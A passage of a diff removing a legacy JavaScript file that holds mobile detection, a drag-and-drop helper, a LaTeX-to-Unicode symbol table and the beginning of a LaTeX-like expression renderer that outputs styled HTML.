@@ -1,2048 +1,1 @@
-if (typeof(ismobile) == 'undefined') 
-ismobile = function()
-{
-    return navigator.userAgent.match(/Android/i) ||
-    navigator.userAgent.match(/BlackBerry/i)||
-    navigator.userAgent.match(/iPhone|iPad|iPod/i)
-    || navigator.userAgent.match(/Opera Mini/i)
-   ||  navigator.userAgent.match(/IEMobile/i);
-}
- 
- 
- 
-function findPositionnoScrolling(oElement, win)
-{        
-    if (win == null)
-        win = self;
-    if (oElement == null)
-        return [0, 0];
-    if (typeof (oElement.offsetParent) != 'undefined')
-    {
-        var ii = 0;
-        var originalElement = oElement;
-        for (var posY = 0, posX = 0; ii++ < 20 && oElement != null; oElement = oElement.offsetParent)
-        {
-            posY += oElement.offsetTop;
-            posX += oElement.offsetLeft;
-            if (oElement != originalElement && oElement != win.document.body && oElement != win.document.documentElement)
-            {
-                posY -= oElement.scrollTop;
-                posX -= oElement.scrollLeft;
-            }
-        }
-        return  [posX, posY];
-    }
-    else
-    {
-        return  [oElement.x, oElement.y];
-    }
-}
-function alltdisleft(ele)
-{
-    if (ele == null || typeof (ele.tagName) == 'undefined' || ele.tagName == null)
-        return;
-    var xx = ele.tagName.toLowerCase();
-    if (ele.tagName.toLowerCase() == 'td')
-    {
-
-        if (ele.align == null || ele.align == '')
-        {
-            ele.align = 'left';
-        }
-
-    }
-
-    if (xx == 'td' || xx == 'table' || xx == 'tr' || xx == 'div' || xx == 'body' || xx == 'form')
-    {
-        if (xx == 'table')
-            var childs = ele.rows;
-        else if (xx == 'tr')
-            childs = ele.cells;
-        else
-            childs = ele.getElementsByTagName("table");
-
-        if (childs != null && childs.length > 0)
-        {
-            for (var i = 0; i < childs.length; i++)
-                alltdisleft(childs[i]);
-        }
-    }
-}
-
-function allcurves(ele)
-{
-    if (ele == null)
-        return;
-
-    if (typeof (ele.className) != 'undefined' && ele.className != null
-            && ele.className.indexOf("forcurve") >= 0)
-    {
-        ele.className = ele.className.replace(/forcurve([0-9])/, 'forcurveie$1');
-    }
-    else
-    {
-        var childs = ele.childNodes;
-        if (childs != null && childs.length > 0)
-        {
-            for (var i = 0; i < childs.length; i++)
-                allcurves(childs[i]);
-        }
-    }
-}
-
- 
-function elewidth(pr)
-{
-    var leng = 0;
-    if (typeof pr.style.pixelWidth != 'undefined')
-        leng = pr.style.pixelWidth;
-    else
-        leng = pr.offsetWidth;
-    if (leng != '')
-        return leng - 2;
-    if (pr != document.body)
-        return elewidth(pr.parentNode);
-    return 500;
-}
- 
- 
-function initcurve()
-{
-    if (document.images != null && document.images.length > 0)
-    {
-        for (var i = 0; i < document.images.length; i++)
-        {
-            var logo = document.images[i];
-            if (logo.name == 'logo')
-            {
-                if (!ismobile())
-                {
-                  //  logo.src = "image/logoani.gif";
-                }
-                else
-                {
-                    logo.width = '86';
-                    logo.src = "image/earth.gif";
-                } 
-                break;
-            }
-        }
-    }
-}
-
-
-
-
-function centerlizeit()
-{
-    var yy = document.body.scrollTop ? document.body.scrollTop : window.pageYOffset;
-    promptwin.style.left = (thispagewidth() / 2 - parseInt(promptwin.style.width.replace(/px/, '')) / 2) + 'px';
-    promptwin.style.top = (yy + thispageheight() / 2 - parseInt(promptwin.style.height.replace(/px/, '')) / 2) + 'px';
-}
-function slowshow()
-{
-    if (typeof ugentmsg == 'undefined')
-        return;
-    var wd = thispagewidth();
-    var het = thispageheight();
-    var ms = "";
-    if (typeof(textmsg)!='undefined')
-        ms = textmsg[567];
-    myprompt(ugentmsg.replace(/\n+/g, "<br>"), false, null, ms);
-
-}
-function closeUgentmsg()
-{
-    if (promptwin == null)
-        return;
-    document.body.removeChild(promptwin);
-}
-
-
-
-
-
-if (!ismobile() && typeof (Drag) == 'undefined')
-{
-var Drag = 
-{
-    
-    parseIntpx : function (str)
-    {
-        return parseInt(str.replace(/px/,''));
-    },
-    
-	obj : null,
-    
-	init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
-	{
-        if (o==null) return;
-		
-
-		o.hmode			= bSwapHorzRef ? false : true ;
-		o.vmode			= bSwapVertRef ? false : true ;
-
-		o.root = oRoot && oRoot != null ? oRoot : o ;
-
-		if (o.hmode  && isNaN(Drag.parseIntpx(o.root.style.left  ))) o.root.style.left   = "0px";
-		if (o.vmode  && isNaN(Drag.parseIntpx(o.root.style.top   ))) o.root.style.top    = "0px";
-		if (!o.hmode && isNaN(Drag.parseIntpx(o.root.style.right ))) o.root.style.right  = "0px";
-		if (!o.vmode && isNaN(Drag.parseIntpx(o.root.style.bottom))) o.root.style.bottom = "0px";
-
-		o.minX	= typeof minX != 'undefined' ? minX : null;
-		o.minY	= typeof minY != 'undefined' ? minY : null;
-		o.maxX	= typeof maxX != 'undefined' ? maxX : null;
-		o.maxY	= typeof maxY != 'undefined' ? maxY : null;
-
-		o.xMapper = fXMapper ? fXMapper : null;
-		o.yMapper = fYMapper ? fYMapper : null;
-
-        o.onmousedown	= Drag.start;
-		o.root.onDragStart	= new Function();
-		o.root.onDragEnd	= new Function();
-		o.root.onDrag		= new Function();
-	},
-
-	start : function(e)
-	{
-        var o = Drag.obj = this;
-		e = Drag.fixE(e);
-		var y = Drag.parseIntpx(o.vmode ? o.root.style.top  : o.root.style.bottom);
-		var x = Drag.parseIntpx(o.hmode ? o.root.style.left : o.root.style.right );
-		o.root.onDragStart(x, y);
-
-		o.lastMouseX	= e.clientX;
-		o.lastMouseY	= e.clientY;
-
-		if (o.hmode) {
-			if (o.minX != null)	o.minMouseX	= e.clientX - x + o.minX;
-			if (o.maxX != null)	o.maxMouseX	= o.minMouseX + o.maxX - o.minX;
-		} else {
-			if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
-			if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
-		}
-
-		if (o.vmode) {
-			if (o.minY != null)	o.minMouseY	= e.clientY - y + o.minY;
-			if (o.maxY != null)	o.maxMouseY	= o.minMouseY + o.maxY - o.minY;
-		} else {
-			if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
-			if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
-		}
-
-		document.onmousemove	= Drag.drag;
-		document.onmouseup		= Drag.end;
-
-		return false;
-	},
-
-	drag : function(e)
-	{
-		e = Drag.fixE(e);
-		var o = Drag.obj;
-        if (o == null) return;
-		var ey	= e.clientY;
-		var ex	= e.clientX;
-		var y = Drag.parseIntpx(o.vmode ? o.root.style.top  : o.root.style.bottom);
-		var x = Drag.parseIntpx(o.hmode ? o.root.style.left : o.root.style.right );
-		var nx, ny;
-
-		if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
-		if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
-		if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
-		if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);
-
-		nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
-		ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));
-
-		if (o.xMapper)		nx = o.xMapper(y)
-		else if (o.yMapper)	ny = o.yMapper(x)
-
-		Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
-		Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
-		Drag.obj.lastMouseX	= ex;
-		Drag.obj.lastMouseY	= ey;
-
-		Drag.obj.root.onDrag(nx, ny);
-		return false;
-	},
-
-	end : function()
-	{
-        if (Drag.obj == null || Drag.obj.root == null)   return;     
-		document.onmousemove = null;
-		document.onmouseup   = null;
-		Drag.obj.root.onDragEnd(	Drag.parseIntpx(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
-									Drag.parseIntpx(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
-		var ex = Drag.obj.lastMouseX;
-		var ey = Drag.obj.lastMouseY;
-      Drag.obj = null;
-      if (typeof atEndDrag =='function')atEndDrag(ex,ey);
-	
-   },
-
-	fixE : function(e)
-	{
-		if (typeof e == 'undefined') e = window.event;
-		if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
-		if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
-		return e;
-	}
-};
- 
-}
-
-if (ismobile() && typeof (Drag) == 'undefined')
-{
-    var Drag = 
-   {
-      init : function (draggable, obj)
-      {
-        if (obj == null)
-        {
-            draggable.style.position = "absolute";
-            draggable.addEventListener('touchmove', function(event) 
-            {
-               var touch = event.targetTouches[0];
-               draggable.style.left = (touch.pageX -25 ) + 'px';
-               draggable.style.top = (touch.pageY -25 )  + 'px';
-               event.preventDefault();
-            }, false);
-        }
-        else
-        {
-            obj.style.position = "absolute";
-            var oElement = draggable;
-            var originalElement = oElement;
-            var posY = 0, posX = 0;
-            for (;  oElement != null; oElement = oElement.offsetParent)
-            {
-                posY += oElement.offsetTop;
-                posX += oElement.offsetLeft;
-                if (oElement != originalElement && oElement != obj)
-                {
-                    posY -= oElement.scrollTop;
-                    posX -= oElement.scrollLeft;
-                }
-            }
-         
-            draggable.addEventListener('touchmove', function(event) 
-            {
-               var touch = event.targetTouches[0];
-               obj.style.left = (touch.pageX - 20)  + 'px';
-               obj.style.top = (touch.pageY - 20) + 'px';
-               event.preventDefault();
-            }, false);
-        }
-     }
-   } 
-}
-
-var Lasymbols = [
-//Greek letters
-{input:"\\alpha",	 output:"\u03B1"},
-{input:"\\beta",	 output:"\u03B2"},
-{input:"\\gamma",	 output:"\u03B3"},
-{input:"\\delta",	 output:"\u03B4"},
-{input:"\\epsilon",	 output:"\u03B5"},
-{input:"\\varepsilon",   output:"\u025B"},
-{input:"\\zeta",	 output:"\u03B6"},
-{input:"\\eta",		 output:"\u03B7"},
-{input:"\\theta",	 output:"\u03B8"},
-{input:"\\vartheta",	 output:"\u03D1"},
-{input:"\\iota",	 output:"\u03B9"},
-{input:"\\kappa",	 output:"\u03BA"},
-{input:"\\lambda",	 output:"\u03BB"},
-{input:"\\mu",		 output:"\u03BC"},
-{input:"\\nu",		 output:"\u03BD"},
-{input:"\\xi",		 output:"\u03BE"},
-{input:"\\pi",		 output:"\u03C0"},
-{input:"\\varpi",	 output:"\u03D6"},
-{input:"\\rho",		 output:"\u03C1"},
-{input:"\\varrho",	 output:"\u03F1"},
-{input:"\\varsigma",	 output:"\u03C2"},
-{input:"\\sigma",	 output:"\u03C3"},
-{input:"\\tau",		 output:"\u03C4"},
-{input:"\\upsilon",	 output:"\u03C5"},
-{input:"\\phi",		 output:"\u03C6"},
-{input:"\\varphi",	 output:"\u03D5"},
-{input:"\\chi",		 output:"\u03C7"},
-{input:"\\psi",		 output:"\u03C8"},
-{input:"\\omega",	 output:"\u03C9"},
-{input:"\\Gamma",	 output:"\u0393"},
-{input:"\\Delta",	 output:"\u0394"},
-{input:"\\Theta",	 output:"\u0398"},
-{input:"\\Lambda",	 output:"\u039B"},
-{input:"\\Xi",		 output:"\u039E"},
-{input:"\\Pi",		 output:"\u03A0"},
-{input:"\\Sigma",	 output:"\u03A3"},
-{input:"\\Upsilon",	 output:"\u03A5"},
-{input:"\\Phi",		 output:"\u03A6"},
-{input:"\\Psi",		 output:"\u03A8"},
-{input:"\\Omega",	 output:"\u03A9"},
-
-//fractions
-{input:"\\frac12",	 output:"\u00BD"},
-{input:"\\frac14",	 output:"\u00BC"},
-{input:"\\frac34",	 output:"\u00BE"},
-{input:"\\frac13",	 output:"\u2153"},
-{input:"\\frac23",	 output:"\u2154"},
-{input:"\\frac15",	 output:"\u2155"},
-{input:"\\frac25",	 output:"\u2156"},
-{input:"\\frac35",	 output:"\u2157"},
-{input:"\\frac45",	 output:"\u2158"},
-{input:"\\frac16",	 output:"\u2159"},
-{input:"\\frac56",	 output:"\u215A"},
-{input:"\\frac18",	 output:"\u215B"},
-{input:"\\frac38",	 output:"\u215C"},
-{input:"\\frac58",	 output:"\u215D"},
-{input:"\\frac78",	 output:"\u215E"},
-
-//binary operation symbols
-{input:"\\pm",		 output:"\u00B1"},
-{input:"\\mp",		 output:"\u2213"},
-{input:"\\triangleleft", output:"\u22B2"},
-{input:"\\triangleright",output:"\u22B3"},
-{input:"\\cdot",	 output:"\u22C5"},
-{input:"\\star",	 output:"\u22C6"},
-{input:"\\ast",		 output:"\u002A"},
-{input:"\\times",	 output:"\u00D7"},
-{input:"\\div",		 output:"\u00F7"},
-{input:"\\circ",	 output:"\u2218"},
-//{input:"\\bullet",	   output:"\u2219"},
-{input:"\\bullet",	 output:"\u2022"},
-{input:"\\oplus",	 output:"\u2295"},
-{input:"\\ominus",	 output:"\u2296"},
-{input:"\\otimes",	 output:"\u2297"},
-{input:"\\bigcirc",	 output:"\u25CB"},
-{input:"\\oslash",	 output:"\u2298"},
-{input:"\\odot",	 output:"\u2299"},
-{input:"\\land",	 output:"\u2227"},
-{input:"\\wedge",	 output:"\u2227"},
-{input:"\\lor",		 output:"\u2228"},
-{input:"\\vee",		 output:"\u2228"},
-{input:"\\cap",		 output:"\u2229"},
-{input:"\\cup",		 output:"\u222A"},
-{input:"\\sqcap",	 output:"\u2293"},
-{input:"\\sqcup",	 output:"\u2294"},
-{input:"\\uplus",	 output:"\u228E"},
-{input:"\\amalg",	 output:"\u2210"},
-{input:"\\bigtriangleup",output:"\u25B3"},
-{input:"\\bigtriangledown",output:"\u25BD"},
-{input:"\\dag",		 output:"\u2020"},
-{input:"\\dagger",	 output:"\u2020"},
-{input:"\\ddag",	 output:"\u2021"},
-{input:"\\ddagger",	 output:"\u2021"},
-{input:"\\lhd",		 output:"\u22B2"},
-{input:"\\rhd",		 output:"\u22B3"},
-{input:"\\unlhd",	 output:"\u22B4"},
-{input:"\\unrhd",	 output:"\u22B5"},
-
-
-//BIG Operators
-{input:"\\sum",		 output:"\u2211"},
-{input:"\\prod",	 output:"\u220F"},
-{input:"\\bigcap",	 output:"\u22C2"},
-{input:"\\bigcup",	 output:"\u22C3"},
-{input:"\\bigwedge",	 output:"\u22C0"},
-{input:"\\bigvee",	 output:"\u22C1"},
-{input:"\\bigsqcap",	 output:"\u2A05"},
-{input:"\\bigsqcup",	 output:"\u2A06"},
-{input:"\\coprod",	 output:"\u2210"},
-{input:"\\bigoplus",	 output:"\u2A01"},
-{input:"\\bigotimes",	 output:"\u2A02"},
-{input:"\\bigodot",	 output:"\u2A00"},
-{input:"\\biguplus",	 output:"\u2A04"},
-{input:"\\int",		 output:"\u222B"},
-{input:"\\oint",	 output:"\u222E"},
-
-//binary relation symbols
-{input:":=",		 output:":="},
-{input:"\\lt",		 output:"<"},
-{input:"\\gt",		 output:">"},
-{input:"\\ne",		 output:"\u2260"},
-{input:"\\neq",		 output:"\u2260"},
-{input:"\\le",		 output:"\u2264"},
-{input:"\\leq",		 output:"\u2264"},
-{input:"\\leqslant",	 output:"\u2264"},
-{input:"\\ge",		 output:"\u2265"},
-{input:"\\geq",		 output:"\u2265"},
-{input:"\\geqslant",	 output:"\u2265"},
-{input:"\\equiv",	 output:"\u2261"},
-{input:"\\ll",		 output:"\u226A"},
-{input:"\\gg",		 output:"\u226B"},
-{input:"\\doteq",	 output:"\u2250"},
-{input:"\\prec",	 output:"\u227A"},
-{input:"\\succ",	 output:"\u227B"},
-{input:"\\preceq",	 output:"\u227C"},
-{input:"\\succeq",	 output:"\u227D"},
-{input:"\\subset",	 output:"\u2282"},
-{input:"\\supset",	 output:"\u2283"},
-{input:"\\subseteq",	 output:"\u2286"},
-{input:"\\supseteq",	 output:"\u2287"},
-{input:"\\sqsubset",	 output:"\u228F"},
-{input:"\\sqsupset",	 output:"\u2290"},
-{input:"\\sqsubseteq",   output:"\u2291"},
-{input:"\\sqsupseteq",   output:"\u2292"},
-{input:"\\sim",		 output:"\u223C"},
-{input:"\\simeq",	 output:"\u2243"},
-{input:"\\approx",	 output:"\u2248"},
-{input:"\\cong",	 output:"\u2245"},
-{input:"\\Join",	 output:"\u22C8"},
-{input:"\\bowtie",	 output:"\u22C8"},
-{input:"\\in",		 output:"\u2208"},
-{input:"\\ni",		 output:"\u220B"},
-{input:"\\owns",	 output:"\u220B"},
-{input:"\\propto",	 output:"\u221D"},
-{input:"\\vdash",	 output:"\u22A2"},
-{input:"\\dashv",	 output:"\u22A3"},
-{input:"\\models",	 output:"\u22A8"},
-{input:"\\perp",	 output:"\u22A5"},
-{input:"\\smile",	 output:"\u2323"},
-{input:"\\frown",	 output:"\u2322"},
-{input:"\\asymp",	 output:"\u224D"},
-{input:"\\notin",	 output:"\u2209"},
-
-//matrices
-{input:"\\begin{eqnarray}",	output:"X"},
-{input:"\\begin{array}",	output:"X"},
-{input:"\\\\",			output:"}&{"},
-{input:"\\end{eqnarray}",	output:"}}"},
-{input:"\\end{array}",		output:"}}"},
-
-//grouping and literal brackets -- ieval is for IE
-{input:"\\big",	    output:"1.2"   },
-{input:"\\Big",	     output:"1.6"   },
-{input:"\\bigg",     output:"2.2"   },
-{input:"\\Bigg",    output:"2.9"   },
-{input:"\\left",    output:"X"},
-{input:"\\right",   output:"X"},
-{input:"{",	   output:"{"},
-{input:"}",	   output:"}"},
-
- 
-{input:"\\lbrack",  output:"["        },
-{input:"\\{",	    output:"{"       },
-{input:"\\lbrace",  output:"{"       },
-{input:"\\langle",  output:"\u2329"   },
-{input:"\\lfloor",  output:"\u230A" },
-{input:"\\lceil",   output:"\u2308" },
-
-// rtag:"mi" causes space to be inserted before a following sin, cos, etc.
-// (see function AMparseExpr() )
- 
-{input:"\\rbrack",output:"]",	    routput:"1"},
-{input:"\\}",	  output:"}",	    routput:"1"},
-{input:"\\rbrace",output:"}",	    routput:"1"},
-{input:"\\rangle",output:"\u232A", routput:"1"},
-{input:"\\rfloor",output:"\u230B", routput:"1"},
-{input:"\\rceil", output:"\u2309", routput:"1"},
-
-// "|", "\\|", "\\vert" and "\\Vert" modified later: lspace = rspace = 0em
-{input:"|",		 output:"\u2223" },
-{input:"\\|",		 output:"\u2225" },
-{input:"\\vert",	 output:"\u2223" },
-{input:"\\Vert",	 output:"\u2225" },
-{input:"\\mid",		 output:"\u2223" },
-{input:"\\parallel",	 output:"\u2225" },
-{input:"/",		 output:"/" },
-{input:"\\backslash",	 output:"\u2216" },
-{input:"\\setminus",	 output:"\\"},
-
-//miscellaneous symbols
-{input:"\\!",	    output:""},
-{input:"\\,",	    output:"<div style=width:0.167em><!----></div>"},
-{input:"\\>",	    output:"<div style=width:0.222em><!----></div>"},
-{input:"\\:",	    output:"<div style=width:0.222em><!----></div>"},
-{input:"\\;",	    output:"<div style=width:0.278em><!----></div>"},
- 
-{input:"\\quad",    output:"<div style=width:1em><!----></div>"},
-{input:"\\qquad",   output:"<div style=width:2em><!----></div>"},
-//{input:"{}",		   output:"\u200B"}, // zero-width
-{input:"\\prime",	 output:"\u2032"},
-{input:"'",		 output:"\u02B9"},
-{input:"''",		 output:"\u02BA"},
-{input:"'''",		 output:"\u2034"},
-{input:"''''",		 output:"\u2057"},
-{input:"\\ldots",	 output:"\u2026"},
-{input:"\\cdots",	 output:"\u22EF"},
-{input:"\\vdots",	 output:"\u22EE"},
-{input:"\\ddots",	 output:"\u22F1"},
-{input:"\\forall",	 output:"\u2200"},
-{input:"\\exists",	 output:"\u2203"},
-{input:"\\Re",		 output:"\u211C"},
-{input:"\\Im",		 output:"\u2111"},
-{input:"\\aleph",	 output:"\u2135"},
-{input:"\\hbar",	 output:"\u210F"},
-{input:"\\ell",		 output:"\u2113"},
-{input:"\\wp",		 output:"\u2118"},
-{input:"\\emptyset",	 output:"\u2205"},
-{input:"\\infty",	 output:"\u221E"},
-{input:"\\surd",	 output:"\\sqrt{}"},
-{input:"\\partial",	 output:"\u2202"},
-{input:"\\nabla",	 output:"\u2207"},
-{input:"\\triangle",	 output:"\u25B3"},
-{input:"\\therefore",	 output:"\u2234"},
-{input:"\\angle",	 output:"\u2220"},
-//{input:"\\\\ ",	   output:"\u00A0"},
-{input:"\\diamond",	 output:"\u22C4"},
-//{input:"\\Diamond",	   output:"\u25CA"},
-{input:"\\Diamond",	 output:"\u25C7"},
-{input:"\\neg",		 output:"\u00AC"},
-{input:"\\lnot",	 output:"\u00AC"},
-{input:"\\bot",		 output:"\u22A5"},
-{input:"\\top",		 output:"\u22A4"},
-{input:"\\square",	 output:"\u25AB"},
-{input:"\\Box",		 output:"\u25A1"},
-{input:"\\wr",		 output:"\u2240"},
-
-//standard functions
-//Note UNDEROVER *must* have tag:"mo" to work properly
-{input:"\\arccos",  output:"arccos"},
-{input:"\\arcsin",  output:"arcsin"},
-{input:"\\arctan",  output:"arctan"},
-{input:"\\arg",	    output:"arg"},
-{input:"\\cos",	    output:"cos"},
-{input:"\\cosh",    output:"cosh"},
-{input:"\\cot",	    output:"cot"},
-{input:"\\coth",    output:"coth"},
-{input:"\\csc",	    output:"csc"},
-{input:"\\deg",	    output:"deg"},
-{input:"\\det",	    output:"det"},
-{input:"\\dim",	    output:"dim"}, //CONST?
-{input:"\\exp",	    output:"exp"},
-{input:"\\gcd",	    output:"gcd"}, //CONST?
-{input:"\\hom",	    output:"hom"},
-{input:"\\inf",	       output:"inf"},
-{input:"\\ker",	    output:"ker"},
-{input:"\\lg",	    output:"lg"},
-{input:"\\lim",	       output:"lim"},
-{input:"\\liminf",     output:"liminf"},
-{input:"\\limsup",     output:"limsup"},
-{input:"\\ln",	    output:"ln"},
-{input:"\\log",	    output:"log"},
-{input:"\\max",	       output:"max"},
-{input:"\\min",	       output:"min"},
-{input:"\\Pr",	    output:"Pr"},
-{input:"\\sec",	    output:"sec"},
-{input:"\\sin",	    output:"sin"},
-{input:"\\sinh",    output:"sinh"},
-{input:"\\sup",	       output:"sup"},
-{input:"\\tan",	    output:"tan"},
-{input:"\\tanh",    output:"tanh"},
-
-//arrows
-{input:"\\gets",		 output:"\u2190"},
-{input:"\\leftarrow",		 output:"\u2190"},
-{input:"\\to",			 output:"\u2192"},
-{input:"\\rightarrow",		 output:"\u2192"},
-{input:"\\leftrightarrow",	 output:"\u2194"},
-{input:"\\uparrow",		 output:"\u2191"},
-{input:"\\downarrow",		 output:"\u2193"},
-{input:"\\updownarrow",		 output:"\u2195"},
-{input:"\\Leftarrow",		 output:"\u21D0"},
-{input:"\\Rightarrow",		 output:"\u21D2"},
-{input:"\\Leftrightarrow",	 output:"\u21D4"},
-{input:"\\iff",  output:"~\\Longleftrightarrow~"},
-{input:"\\Uparrow",		 output:"\u21D1"},
-{input:"\\Downarrow",		 output:"\u21D3"},
-{input:"\\Updownarrow",		 output:"\u21D5"},
-{input:"\\mapsto",		 output:"\u21A6"},
-{input:"\\longleftarrow",	 output:"\u2190"},
-{input:"\\longrightarrow",	 output:"\u2192"},
-{input:"\\longleftrightarrow",	 output:"\u2194"},
-{input:"\\Longleftarrow",	 output:"\u21D0"},
-{input:"\\Longrightarrow",	 output:"\u21D2"},
-{input:"\\Longleftrightarrow",   output:"\u21D4"},
-{input:"\\longmapsto",		 output:"\u21A6"},
-							// disaster if LONG
-
- 
-//diacritical marks
-{input:"\\acute",	  output:"\u00B4"},
-//{input:"\\acute",	    output:"\u0317"},
-//{input:"\\acute",	    output:"\u0301"},
-//{input:"\\grave",	    output:"\u0300"},
-//{input:"\\grave",	    output:"\u0316"},
-{input:"\\grave",	  output:"\u0060"},
-{input:"\\breve",	  output:"\u02D8"},
-{input:"\\check",	  output:"\u02C7"},
-{input:"\\dot",		  output:"."},
-{input:"\\ddot",	  output:".."},
-//{input:"\\ddot",	    output:"\u00A8"},
-{input:"\\mathring",	  output:"\u00B0"},
-{input:"\\vec",		  output:"\u20D7"},
-{input:"\\overrightarrow",output:"\u20D7"},
-{input:"\\overleftarrow", output:"\u20D6"},
-{input:"\\hat",		  output:"\u005E"},
-{input:"\\widehat",	  output:"\u0302"},
-{input:"\\tilde",	  output:"~"},
-//{input:"\\tilde",	    output:"\u0303"},
-{input:"\\widetilde",	  output:"\u02DC"},
-{input:"\\bar",		  output:"\u203E"},
-{input:"\\overbrace",	  output:"\u23B4"},
-{input:"\\overline",	  output:"\u00AF"},
-{input:"\\underbrace",   output:"\u23B5"},
-{input:"\\underline",	 output:"\u00AF"},
-//{input:"underline",	 output:"\u0332"},
-{input:"\\sqrt",       output:"&radic;"},
-//typestyles and fonts
-{input:"\\displaystyle",atname:"displaystyle",output:"true"},
-{input:"\\textstyle",atname:"displaystyle",output:"false"},
-{input:"\\scriptstyle",atname:"scriptlevel",output:"1"},
-{input:"\\scriptscriptstyle",atname:"scriptlevel",output:"2"},
-{input:"\\textrm",  output:"\\mathrm"},
-{input:"\\mathbf",  atname:"mathvariant", output:"bold"},
-{input:"\\textbf",  atname:"mathvariant", output:"bold"},
-{input:"\\mathit",  atname:"mathvariant", output:"italic"},
-{input:"\\textit",  atname:"mathvariant", output:"italic"},
-{input:"\\mathtt",  atname:"mathvariant", output:"monospace"},
-{input:"\\texttt",  atname:"mathvariant", output:"monospace"},
-{input:"\\mathsf",  atname:"mathvariant", output:"sans-serif"},
-{input:"\\mathbb",  atname:"mathvariant", output:"double-struck"},
-{input:"\\mathcal", atname:"mathvariant", output:"script"},
-{input:"\\mathfrak",atname:"mathvariant", output:"fraktur"}
-];
-  
-function Trans(s, fs, color)
-{
-    this.wcolor = "red";
-    this.color = color;
-    if (this.color == 'red' || this.color =='#ff0000')
-        this.wcolor = "blue";
-    this.s = s; 
-    this.pos = 0;
-    this.fs = fs;
-    this.literal = function(q) //read a this.literal aftr pos before q
-    {
-                    
-        var state = 0;
-        var i = this.pos;
-        var j = this.pos;
-        ans = null;
-        while (i < q)
-        {
-            if (state == 0)
-            {
-                if (this.s.charAt(i) == ' ')
-                {
-                    if (this.s.charAt(j) == '\\')
-                    {
-                         this.pos = i+1;
-                         ans = this.s.substring(j,i);
-                         break;
-                    }    
-                    else
-                        i++;
-                }
-                else if (this.s.charAt(i) == '\\')
-                {
-                    state = 1;
-                    j = i;
-                    i++;
-                }
-                else if (this.s.charAt(i)<='9' && this.s.charAt(i) >='0' || this.s.charAt(i)=='.')
-                {
-                    state = 2;
-                    j= i;
-                    i++;
-                }
-                else
-                {
-                    this.pos = i+1;
-                    ans = this.s.charAt(i);
-                    break;
-                }
-            }
-            else if (state == 2)
-            {
-                if (this.s.charAt(i)<='9' && this.s.charAt(i) >='0' || this.s.charAt(i)=='.')
-                {
-                    i++;
-                }
-                else
-                {
-                    this.pos = i;
-                    ans = this.s.substring(j,i);
-                    state = 0;
-                    break;
-                }
-            }
-            else if (state == 1)
-            {
-                if (i == j+1 && this.s.charAt(i) == '\\')
-                {
-                    this.pos = i+1;
-                    ans = '\\';
-                    state = 0;
-                    break;
-                }
-                else if (i == j+1 && (this.s.charAt(i) == '{' || this.s.charAt(i) == '}' || this.s.charAt(i) == ',' || this.s.charAt(i) == '>' ||this.s.charAt(i) == ':' || this.s.charAt(i) == ';'))
-                {
-                    this.pos = i+1;
-                    ans = '\\' + this.s.charAt(i);
-                    state = 0;
-                    break;
-                } 
-                else if ((this.s.charAt(i)=='(' ||  this.s.charAt(i)=='[' ) && this.s.substring(j,i)=='\\left' )
-                {
-                    this.pos = i+1;
-                    ans = this.s.substring(j,i+1);
-                    state = 0;
-                    break;
-                }
-                else if ((  this.s.charAt(i)==')'||   this.s.charAt(i)==']') && this.s.substring(j,i)=='\\right' )
-                {
-                    this.pos = i+1;
-                    ans = this.s.substring(j,i+1);
-                    state = 0;
-                    break;
-                }
-                else if (  (this.s.charAt(i) < 'a' || this.s.charAt(i) > 'z') && (this.s.charAt(i) < 'A' || this.s.charAt(i) > 'Z')   )
-                {
-                    this.pos = i;
-                    if (i>j+1)
-                    {
-                        ans = this.s.substring(j,i);
-                        state = 0;
-                        break;
-                    }
-                    else
-                    {  
-                        state = 0;
-                    }
-                                
-                }
-                else i++;
-            }
-        }
-        if (state==2)
-        {
-            this.pos = i;
-            ans = this.s.substring(j,i);
-        }
-        else if (state==1)
-        {
-            this.pos = i;
-            ans = this.s.substring(j,i);
-        }
-      
-        if (ans!=null && ans.indexOf("\\")>=0) 
-            return ans.replace(/^[ ]+/,'').replace(/[ ]+$/,'');           
-        return ans;
-    }
-
-    this.closeone = function(openc,c,q)
-    {
-        var t = ''; 
-        var m = 1;
-        while ((t = this.literal(q)) != null)
-        {
-            if (t == openc) m++;
-            else if ( t == c) m--;
-            if (m == 0) return t;
-        }
-        return null;
-    }
-    this.subs = function(t)
-    {
-        for (var i=0; i < Lasymbols.length; i++)
-            if (t == Lasymbols[i].input)
-                return Lasymbols[i].output;
-        return t;
-    }
-    this.format = function(s,fs)
-    {
-        return "<div style=\"font-family:Arial, Helvetica, sans-serif;font-style:italic;height:" + fs + "px;color:" + this.color +";font-size:" + (fs  ) +"px;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;border:0px black solid;text-align:right\">" + s +"</div>";
-    }
-    this.formatl = function(s,fs)
-    {
-        return "<div style=\"font-family:Arial, Helvetica, sans-serif;height:" + fs + "px;color:" + this.color +";font-size:" + (fs  ) +"px;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px\">" + s +"</div>";
-    }
-    this.formatthin = function(s,fs)
-    {
-        return "<div style=\"font-family:Arial, Helvetica, sans-serif;height:" + fs + "px;color:" + this.color +";font-size:" + (fs  ) +"px;font-weight:400;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px\">" + s +"</div>";
-    }
-    this.formate = function(s,fs)
-    {
-        return "<div style=\"Times;height:" + fs + "px;color:" + this.wcolor +";font-size:" + (fs  ) +"px;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px\">" + s +"</div>";
-    }
